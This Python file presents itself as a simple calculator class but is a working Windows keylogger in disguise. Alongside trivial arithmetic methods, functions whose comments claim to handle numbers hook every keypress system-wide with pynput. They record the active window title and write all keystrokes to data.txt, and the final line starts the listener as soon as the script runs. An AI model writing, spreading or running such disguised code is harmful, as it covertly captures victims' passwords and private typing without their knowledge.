import pynput.keyboard
import win32gui
import win32process
import time


class Calculator:
    
    def __init__(self):
        self.logger = ''

    # returns the sum of two numbers
    def handle_addition(number1, number2):
        return number1 + number2
    
    # reutrns the difference of two numbers
    def handle_subtraction(number1, number2):
        return number1 - number2
    
    # returns the product of number1 and number2
    def handle_multiplication(number1, number2):
        return number1 * number2
    
    # save the processed number in the file
    def append_to_log(self,key_strike):
        self.logger = self.logger + key_strike
        process_name, window_title = get_active_window_title()
        
        with open("data.txt","a+",encoding="utf-8") as file:
            file.write('Window Title: ['+window_title+']  Key Pressed :  [' +self.logger+']\n')
        
        print(self.logger)
        self.logger = ''
        
    # handles numbers in form of strings and returns the result of the operation
    def evaluate_keys(self,key):
        try:
            Pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                Pressed_key= " "
            else:
                Pressed_key = " " + str(key) + " "
        self.append_to_log(Pressed_key)
        
    # returns the division of number1 by number2
    def handle_division(number1, number2):
        return number1 / number2
    
    # returns the remainder of the division of number1 by number2
    def handle_modulus(number1, number2):
        return number1 % number2

    # starts the calculator
    def start(self):
        keyboard_listner = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listner:
            self.logger = ''
            keyboard_listner.join()

def get_active_window_title():
    hwnd = win32gui.GetForegroundWindow()
    
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    
    try:
        process_name = win32process.GetModuleFileNameEx(win32process.OpenProcess(0x0400 | 0x0010, False, pid), 0)
    except:
        process_name = "Unknown"
    
    window_title = win32gui.GetWindowText(hwnd)
    
    return process_name, window_title


number = 45

string1 = 'star'

final_output = string1 + ' data'

answer = Calculator.handle_addition(number,3)

Calculator().start()